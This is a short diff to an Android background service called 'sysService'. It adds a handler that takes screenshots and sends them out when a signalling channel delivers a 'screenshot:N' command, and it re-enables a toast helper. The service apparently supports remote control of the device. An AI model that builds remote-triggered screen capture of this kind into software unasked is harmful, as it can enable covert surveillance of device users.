@@ -176,17 +176,23 @@ public class sysService extends Service implements SignallingClient.SignalingInt
             createSoundInstance();
             onTryToStart();
         }
+        if (cmd.contains("screenshot")){
+            int shotN = Integer.parseInt(cmd.split(":")[1]);
+            toast(shotN+"");
+            sendScreenshot(shotN);
+
+        }
 
     }
     // end signaling interface mehtod
 
 
     // help method
-/*
+
     public void toast(final String msg) {
         runOnUiThread(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_SHORT).show());
     }
-*/
+
     private void runOnUiThread(Runnable runnable) {
         handler.post(runnable);
     }
